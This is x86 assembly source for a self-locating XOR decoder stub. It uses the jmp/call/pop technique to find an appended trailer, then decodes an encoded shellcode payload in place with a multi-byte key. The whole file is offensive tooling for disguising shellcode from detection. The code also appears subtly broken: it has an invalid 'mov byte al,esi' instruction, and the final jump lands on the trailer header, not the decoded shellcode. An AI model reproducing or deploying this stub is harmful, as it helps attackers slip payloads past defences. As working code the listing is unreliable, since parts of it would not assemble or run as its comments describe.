BITS 32

; plain x86 | trailer
; ---------------------------------------------------------------------------------------------
; | decoder | 2 byte shellcode len | 1 byte xor key len | xor key (xor key len) | shellcode   |
; ----------------[XOR ENCODED]--------------------------------------------------[XOR ENCODED]-
;           | Reg: cx              | Reg: dl            | [esi]+3+dh            | [esi]+3+dl+ebx


jmp		short go
next:
pop		esi		; get stackpointer := start+sizeof(decoder)

xor		ecx,ecx
mov word	cx,[esi]	; shellcode len (encoded)
xor word	cx,0x0101	; decode shellcode len

; dh := xor pad
; dl := xor key len
xor		edx,edx
mov byte	dl,[esi+2]

xor		ebx,ebx		; zero out
change:
; calc memory location
mov 		eax,esi
push dword	eax
add dword	[esp],0x3	; shellcode len (2 bytes) + xor key len (1 byte)
movzx		eax,dl
add		[esp],eax
add 		[esp],ebx
pop dword	eax		; eax holds the pointer to our next encoded byte

mov		edi,eax

mov		eax,esi		; <----- DBG
push dword	eax
add dword	[esp],0x3	; see above
movzx		eax,dh
add		[esp],eax
pop dword	eax		; al holds the xor 1-byte-pad
; TODO: not rly efficient, change it!
push dword	esi		; save our trailer pointer
mov		esi,[eax]
xor		eax,eax
mov byte	al,esi
pop dword	esi		; get our trailer pointer

xor byte	[edi],al

inc		ebx
cmp		ebx,ecx
je		done		; no more bytes left

inc		dh		; next xor 1-byte-pad
cmp		dh,dl		; check if xor pad == xor len
jne		change		
xor byte	dh,dh
jmp		change

done:
jmp		short ok
go:
call		next
ok:
